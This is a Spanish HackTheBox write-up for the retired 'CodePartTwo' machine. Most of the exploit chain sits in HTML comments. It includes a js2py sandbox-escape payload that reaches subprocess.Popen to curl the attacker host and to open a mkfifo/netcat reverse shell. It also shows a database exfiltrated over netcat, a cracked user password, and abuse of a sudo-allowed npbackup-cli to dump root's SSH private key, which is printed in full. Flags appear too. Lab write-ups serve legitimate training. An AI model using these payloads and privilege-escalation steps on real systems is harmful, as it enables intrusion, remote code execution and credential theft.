---
title: 'CodePartTwo Writeup 🔒'
description: 'Es un artículo paso a paso para resolver CodePartTwo en Hackthebox retirada'
tags: ["HackTheBox", "Easy", "Linux", "Actived"]
pubDate: 'Oct 27 2025'
coverImage: './codepart.png'
---

En este tutorial, te mostraré cómo logré obtener el control total sobre la maquina "CodePartTwo" en HackTheBox.

## Escaneo Nmap
```bash
┌──(root㉿tiaago)-[/home/secbytiago/Descargas]
└─# nmap -sV -sC -A 10.10.11.82
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-27 15:03 -03
Nmap scan report for 10.10.11.82
Host is up (0.20s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a0:47:b4:0c:69:67:93:3a:f9:b4:5d:b3:2f:bc:9e:23 (RSA)
|   256 7d:44:3f:f1:b1:e2:bb:3d:91:d5:da:58:0f:51:e5:ad (ECDSA)
|_  256 f1:6b:1d:36:18:06:7a:05:3f:07:57:e1:ef:86:b4:85 (ED25519)
8000/tcp open  http    Gunicorn 20.0.4
|_http-title: Welcome to CodePartTwo
|_http-server-header: gunicorn/20.0.4
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 110/tcp)
HOP RTT       ADDRESS
1   484.20 ms 10.10.14.1
2   484.32 ms 10.10.11.82

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.80 seconds
```

## Archivo App.zip
```bash
┌──(root㉿tiaago)-[/home/secbytiago/Descargas/app]
└─# tree -f   
.
├── ./app.py
├── ./instance
│   └── ./instance/users.db
├── ./requirements.txt
├── ./static
│   ├── ./static/css
│   │   └── ./static/css/styles.css
│   └── ./static/js
│       └── ./static/js/script.js
└── ./templates
    ├── ./templates/base.html
    ├── ./templates/dashboard.html
    ├── ./templates/index.html
    ├── ./templates/login.html
    ├── ./templates/register.html
    └── ./templates/reviews.html
6 directories, 11 files
```

![WARNING placeholder](../WARNING.png)

<!-- ```python
let cmd = "curl 10.10.14.16:666/test;";
let hacked, bymarve, n11;
let getattr, obj;

hacked = Object.getOwnPropertyNames({});
bymarve = hacked.__getattribute__;
n11 = bymarve("__getattribute__");
obj = n11("__class__").__base__;
getattr = obj.__getattribute__;

function findpopen(o) {
  let result;
  for (let i in o.__subclasses__()) {
    let item = o.__subclasses__()[i];
    if (item.__module__ == "subprocess" && item.__name__ == "Popen") {
      return item;
    }
    if (item.__name__ != "type" && (result = findpopen(item))) {
      return result;
    }
  }
}

n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate();
console.log(n11);
n11;
``` -->

<!-- ```bash
┌──(root㉿tiaago)-[/home/secbytiago/Descargas/app]
└─# nc -lvnp 666
listening on [any] 666 ...
connect to [10.10.14.16] from (UNKNOWN) [10.10.11.82] 60682
GET /test HTTP/1.1
Host: 10.10.14.16:666
User-Agent: curl/7.68.0
Accept: */*
``` -->

<!-- ```python
let cmd = "rm f;mkfifo f;cat f|/bin/sh -i 2>&1|nc 10.10.14.16 1425 > f";
let hacked, bymarve, n11
let getattr, obj

hacked = Object.getOwnPropertyNames({})
bymarve = hacked.__getattribute__
n11 = bymarve("__getattribute__")
obj = n11("__class__").__base__
getattr = obj.__getattribute__

function findpopen(o) {
    let result;
    for(let i in o.__subclasses__()) {
        let item = o.__subclasses__()[i]
        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {
            return item
        }
        if(item.__name__ != "type" && (result = findpopen(item))) {
            return result
        }
    }
}

n11 = findpopen(obj)(cmd, -1, null, -1, -1, null, null, true).communicate()
console.log(n11)
n11
``` -->

<!-- ```bash
┌──(root㉿tiaago)-[/home/secbytiago/Descargas/app]
└─# rlwrap -cAr nc -lvnp 1425
listening on [any] 1425 ...
connect to [10.10.14.16] from (UNKNOWN) [10.10.11.82] 56676
/bin/sh: 0: can't access tty; job control turned off
$ whoami
app
$ id
uid=1001(app) gid=1001(app) groups=1001(app)
``` -->

<!-- ```bash
$ script -c /bin/bash -q /dev/null
bash-5.0$ cat /etc/passwd | grep -Ev 'sync|false|nologin'
cat /etc/passwd | grep -Ev 'sync|false|nologin'
root:x:0:0:root:/root:/bin/bash
marco:x:1000:1000:marco:/home/marco:/bin/bash
app:x:1001:1001:,,,:/home/app:/bin/bash
``` -->

<!-- DESDE ROOT -->
<!-- ```bash
┌──(root㉿tiaago)-[/home/secbytiago/Descargas]
└─# nc -lvnp 666 | base64 -d > users.db               
listening on [any] 666 ...
connect to [10.10.14.16] from (UNKNOWN) [10.10.11.82] 36598
                                                                                                
┌──(root㉿tiaago)-[/home/secbytiago/Descargas]
└─# ls
users.db
``` -->

<!-- ```bash
┌──(secbytiago㉿tiaago)-[~/Descargas]
└─$ sudo sqlite3 users.db 
[sudo] contraseña para secbytiago: 
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> SELECT * FROM user;
sqlite> SELECT * FROM user;
1|marco|649c9d65a206a75f5abe509fe128bce5
2|app|a97588c0e2fa3a024876339e27aeb42e
``` -->
<!-- User : marco
Passwd : sweetangelbabylove -->

<!-- ```bash
┌──(root㉿tiaago)-[/home/secbytiago/Descargas]
└─# ssh marco@10.10.11.82
The authenticity of host '10.10.11.82 (10.10.11.82)' can't be established.
ED25519 key fingerprint is SHA256:KGKFyaW9Pm7DDxZe/A8oi/0hkygmBMA8Y33zxkEjcD4.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.82' (ED25519) to the list of known hosts.
marco@10.10.11.82's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Mon 27 Oct 2025 07:26:06 PM UTC

  System load:  0.0               Processes:             230
  Usage of /:   57.7% of 5.08GB   Users logged in:       0
  Memory usage: 24%               IPv4 address for eth0: 10.10.11.82
  Swap usage:   0%

-bash-5.0$ whoami
marco
```

```bash
-bash-5.0$ ls
backups  npbackup.conf  user.txt
-bash-5.0$ cat user.txt 
5a8cc1a1cff89188dc3ca1c821762043
``` -->
<!-- ### User Flag
- 5a8cc1a1cff89188dc3ca1c821762043
```bash
-bash-5.0$ sudo -l
Matching Defaults entries for marco on codeparttwo:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User marco may run the following commands on codeparttwo:
    (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
```

```bash
-bash-5.0$ cat /usr/local/bin/npbackup-cli
#!/usr/bin/python3
# -*- coding: utf-8 -*-
import re
import sys
from npbackup.__main__ import main
if __name__ == '__main__':
    # Block restricted flag
    if '--external-backend-binary' in sys.argv:
        print("Error: '--external-backend-binary' flag is restricted for use.")
        sys.exit(1)

    sys.argv[0] = re.sub(r'(-script\.pyw|\.exe)?$', '', sys.argv[0])
    sys.exit(main())
```

```bash
-bash-5.0$ /usr/local/bin/npbackup-cli -h
usage: npbackup-cli [-h] [-c CONFIG_FILE] [--repo-name REPO_NAME] [--repo-group REPO_GROUP]
                    [-b] [-f] [-r RESTORE] [-s] [--ls [LS]] [--find FIND] [--forget FORGET]
                    [--policy] [--housekeeping] [--quick-check] [--full-check] [--check CHECK]
                    [--prune [PRUNE]] [--prune-max] [--unlock] [--repair-index]
                    [--repair-packs REPAIR_PACKS] [--repair-snapshots] [--repair REPAIR]
                    [--recover] [--list LIST] [--dump DUMP] [--stats [STATS]] [--raw RAW]
                    [--init] [--has-recent-snapshot] [--restore-includes RESTORE_INCLUDES]
                    [--snapshot-id SNAPSHOT_ID] [--json] [--stdin]
                    [--stdin-filename STDIN_FILENAME] [-v] [-V] [--dry-run] [--no-cache]
                    [--license] [--auto-upgrade] [--log-file LOG_FILE] [--show-config]
                    [--external-backend-binary EXTERNAL_BACKEND_BINARY]
                    [--group-operation GROUP_OPERATION] [--create-key CREATE_KEY]
                    [--create-backup-scheduled-task CREATE_BACKUP_SCHEDULED_TASK]
                    [--create-housekeeping-scheduled-task CREATE_HOUSEKEEPING_SCHEDULED_TASK]
                    [--check-config-file]

Portable Network Backup Client This program is distributed under the GNU General Public
License and comes with ABSOLUTELY NO WARRANTY. This is free software, and you are welcome to
redistribute it under certain conditions; Please type --license for more info.

optional arguments:
  -h, --help            show this help message and exit
  -c CONFIG_FILE, --config-file CONFIG_FILE
                        Path to alternative configuration file (defaults to current
                        dir/npbackup.conf)
  --repo-name REPO_NAME
                        Name of the repository to work with. Defaults to 'default'. This can
                        also be a comma separated list of repo names. Can accept special name
                        '__all__' to work with all repositories.
  --repo-group REPO_GROUP
                        Comme separated list of groups to work with. Can accept special name
                        '__all__' to work with all repositories.
  -b, --backup          Run a backup
  -f, --force           Force running a backup regardless of existing backups age
  -r RESTORE, --restore RESTORE
                        Restore to path given by --restore, add --snapshot-id to specify a
                        snapshot other than latest
  -s, --snapshots       Show current snapshots
  --ls [LS]             Show content given snapshot. When no snapshot id is given, latest is
                        used
  --find FIND           Find full path of given file / directory
  --forget FORGET       Forget given snapshot (accepts comma separated list of snapshots)
  --policy              Apply retention policy to snapshots (forget snapshots)
  --housekeeping        Run --check quick, --policy and --prune in one go
  --quick-check         Deprecated in favor of --'check quick'. Quick check repository
  --full-check          Deprecated in favor of '--check full'. Full check repository (read all
                        data)
  --check CHECK         Checks the repository. Valid arguments are 'quick' (metadata check)
                        and 'full' (metadata + data check)
  --prune [PRUNE]       Prune data in repository, also accepts max parameter in order prune
                        reclaiming maximum space
  --prune-max           Deprecated in favor of --prune max
  --unlock              Unlock repository
  --repair-index        Deprecated in favor of '--repair index'.Repair repo index
  --repair-packs REPAIR_PACKS
                        Deprecated in favor of '--repair packs'. Repair repo packs ids given
                        by --repair-packs
  --repair-snapshots    Deprecated in favor of '--repair snapshots'.Repair repo snapshots
  --repair REPAIR       Repair the repository. Valid arguments are 'index', 'snapshots', or
                        'packs'
  --recover             Recover lost repo snapshots
  --list LIST           Show [blobs|packs|index|snapshots|keys|locks] objects
  --dump DUMP           Dump a specific file to stdout (full path given by --ls), use with
                        --dump [file], add --snapshot-id to specify a snapshot other than
                        latest
  --stats [STATS]       Get repository statistics. If snapshot id is given, only snapshot
                        statistics will be shown. You may also pass "--mode raw-data" or "--
                        mode debug" (with double quotes) to get full repo statistics
  --raw RAW             Run raw command against backend. Use with --raw "my raw backend
                        command"
  --init                Manually initialize a repo (is done automatically on first backup)
  --has-recent-snapshot
                        Check if a recent snapshot exists
  --restore-includes RESTORE_INCLUDES
                        Restore only paths within include path, comma separated list accepted
  --snapshot-id SNAPSHOT_ID
                        Choose which snapshot to use. Defaults to latest
  --json                Run in JSON API mode. Nothing else than JSON will be printed to stdout
  --stdin               Backup using data from stdin input
  --stdin-filename STDIN_FILENAME
                        Alternate filename for stdin, defaults to 'stdin.data'
  -v, --verbose         Show verbose output
  -V, --version         Show program version
  --dry-run             Run operations in test mode, no actual modifications
  --no-cache            Run operations without cache
  --license             Show license
  --auto-upgrade        Auto upgrade NPBackup
  --log-file LOG_FILE   Optional path for logfile
  --show-config         Show full inherited configuration for current repo. Optionally you can
                        set NPBACKUP_MANAGER_PASSWORD env variable for more details.
  --external-backend-binary EXTERNAL_BACKEND_BINARY
                        Full path to alternative external backend binary
  --group-operation GROUP_OPERATION
                        Deprecated command to launch operations on multiple repositories. Not
                        needed anymore. Replaced by --repo-name x,y or --repo-group x,y
  --create-key CREATE_KEY
                        Create a new encryption key, requires a file path
  --create-backup-scheduled-task CREATE_BACKUP_SCHEDULED_TASK
                        Create a scheduled backup task, specify an argument interval via
                        interval=minutes, or hour=hour,minute=minute for a daily task
  --create-housekeeping-scheduled-task CREATE_HOUSEKEEPING_SCHEDULED_TASK
                        Create a scheduled housekeeping task, specify hour=hour,minute=minute
                        for a daily task
  --check-config-file   Check if config file is valid
``` -->
<!-- 
```bash
-bash-5.0$ cat npbackup.conf 
conf_version: 3.0.1
audience: public
repos:
  default:
    repo_uri: 
      __NPBACKUP__wd9051w9Y0p4ZYWmIxMqKHP81/phMlzIOYsL01M9Z7IxNzQzOTEwMDcxLjM5NjQ0Mg8PDw8PDw8PDw8PDw8PD6yVSCEXjl8/9rIqYrh8kIRhlKm4UPcem5kIIFPhSpDU+e+E__NPBACKUP__
    repo_group: default_group
    backup_opts:
      paths:
      - /home/app/app/
      source_type: folder_list
      exclude_files_larger_than: 0.0
    repo_opts:
      repo_password: 
        __NPBACKUP__v2zdDN21b0c7TSeUZlwezkPj3n8wlR9Cu1IJSMrSctoxNzQzOTEwMDcxLjM5NjcyNQ8PDw8PDw8PDw8PDw8PD0z8n8DrGuJ3ZVWJwhBl0GHtbaQ8lL3fB0M=__NPBACKUP__
      retention_policy: {}
      prune_max_unused: 0
    prometheus: {}
    env: {}
    is_protected: false
groups:
  default_group:
    backup_opts:
      paths: []
      source_type:
      stdin_from_command:
      stdin_filename:
      tags: []
      compression: auto
      use_fs_snapshot: true
      ignore_cloud_files: true
      one_file_system: false
      priority: low
      exclude_caches: true
      excludes_case_ignore: false
      exclude_files:
      - excludes/generic_excluded_extensions
      - excludes/generic_excludes
      - excludes/windows_excludes
      - excludes/linux_excludes
      exclude_patterns: []
      exclude_files_larger_than:
      additional_parameters:
      additional_backup_only_parameters:
      minimum_backup_size_error: 10 MiB
      pre_exec_commands: []
      pre_exec_per_command_timeout: 3600
      pre_exec_failure_is_fatal: false
      post_exec_commands: []
      post_exec_per_command_timeout: 3600
      post_exec_failure_is_fatal: false
      post_exec_execute_even_on_backup_error: true
      post_backup_housekeeping_percent_chance: 0
      post_backup_housekeeping_interval: 0
    repo_opts:
      repo_password:
      repo_password_command:
      minimum_backup_age: 1440
      upload_speed: 800 Mib
      download_speed: 0 Mib
      backend_connections: 0
      retention_policy:
        last: 3
        hourly: 72
        daily: 30
        weekly: 4
        monthly: 12
        yearly: 3
        tags: []
        keep_within: true
        group_by_host: true
        group_by_tags: true
        group_by_paths: false
        ntp_server:
      prune_max_unused: 0 B
      prune_max_repack_size:
    prometheus:
      backup_job: ${MACHINE_ID}
      group: ${MACHINE_GROUP}
    env:
      env_variables: {}
      encrypted_env_variables: {}
    is_protected: false
identity:
  machine_id: ${HOSTNAME}__blw0
  machine_group:
global_prometheus:
  metrics: false
  instance: ${MACHINE_ID}
  destination:
  http_username:
  http_password:
  additional_labels: {}
  no_cert_verify: false
global_options:
  auto_upgrade: false
  auto_upgrade_percent_chance: 5
  auto_upgrade_interval: 15
  auto_upgrade_server_url:
  auto_upgrade_server_username:
  auto_upgrade_server_password:
  auto_upgrade_host_identity: ${MACHINE_ID}
  auto_upgrade_group: ${MACHINE_GROUP}
``` -->

<!-- cambio /home/app/app/ a /root/.ssh/ -->

<!-- ```bash
-bash-5.0$ sudo /usr/local/bin/npbackup-cli -c npbackup.conf -b -f
2025-10-27 19:45:40,985 :: INFO :: npbackup 3.0.1-linux-UnknownBuildType-x64-legacy-public-3.8-i 2025032101 - Copyright (C) 2022-2025 NetInvent running as root
2025-10-27 19:45:41,015 :: INFO :: Loaded config 7BD385E4 in /home/marco/npbackup.conf
2025-10-27 19:45:41,027 :: INFO :: Running backup of ['/root/.ssh/'] to repo default
2025-10-27 19:45:42,223 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/generic_excluded_extensions
2025-10-27 19:45:42,224 :: ERROR :: Exclude file 'excludes/generic_excluded_extensions' not found
2025-10-27 19:45:42,224 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/generic_excludes
2025-10-27 19:45:42,224 :: ERROR :: Exclude file 'excludes/generic_excludes' not found
2025-10-27 19:45:42,224 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/windows_excludes
2025-10-27 19:45:42,224 :: ERROR :: Exclude file 'excludes/windows_excludes' not found
2025-10-27 19:45:42,224 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/linux_excludes
2025-10-27 19:45:42,224 :: ERROR :: Exclude file 'excludes/linux_excludes' not found
2025-10-27 19:45:42,225 :: WARNING :: Parameter --use-fs-snapshot was given, which is only compatible with Windows
no parent snapshot found, will read all files

Files:           2 new,     0 changed,     0 unmodified
Dirs:            2 new,     0 changed,     0 unmodified
Added to the repository: 4.466 KiB (4.188 KiB stored)

processed 2 files, 3.094 KiB in 0:00
snapshot 9ab7ee40 saved
2025-10-27 19:45:43,502 :: INFO :: Backend finished with success
2025-10-27 19:45:43,504 :: INFO :: Processed 3.1 KiB of data
2025-10-27 19:45:43,504 :: ERROR :: Backup is smaller than configured minmium backup size
2025-10-27 19:45:43,504 :: ERROR :: Operation finished with failure
2025-10-27 19:45:43,505 :: INFO :: Runner took 2.479463 seconds for backup
2025-10-27 19:45:43,505 :: INFO :: Operation finished
2025-10-27 19:45:43,512 :: INFO :: ExecTime = 0:00:02.529448, finished, state is: errors.
``` -->

<!-- ```bash
-bash-5.0$ sudo /usr/local/bin/npbackup-cli -c npbackup.conf -f --dump /root/.ssh/id_rsa | tee id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
``` -->
<!-- 
```bash
-bash-5.0$ ls
backups  id_rsa  npbackup.conf  user.txt
``` -->

<!-- ```bash
┌──(root㉿tiaago)-[/home/secbytiago/Descargas/app]
└─# chmod 600 id_rsa
                                                                                                
┌──(root㉿tiaago)-[/home/secbytiago/Descargas/app]
└─# ssh -i id_rsa root@10.10.11.82
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Mon 27 Oct 2025 07:52:40 PM UTC

  System load:  0.0               Processes:             234
  Usage of /:   57.8% of 5.08GB   Users logged in:       0
  Memory usage: 25%               IPv4 address for eth0: 10.10.11.82
  Swap usage:   0%


Expanded Security Maintenance for Infrastructure is not enabled.

0 updates can be applied immediately.

Enable ESM Infra to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Mon Oct 27 19:52:41 2025 from 10.10.14.16
root@codeparttwo:~# 
``` -->

<!-- ```bash
root@codeparttwo:~# ls
root.txt  scripts
root@codeparttwo:~# cat root.txt 
e2eeb890691e626b964ad13133445906
``` -->

<!-- ### Root Flag
- e2eeb890691e626b964ad13133445906 -->

<!-- https://blog.csdn.net/qq_43007452/article/details/150579258 -->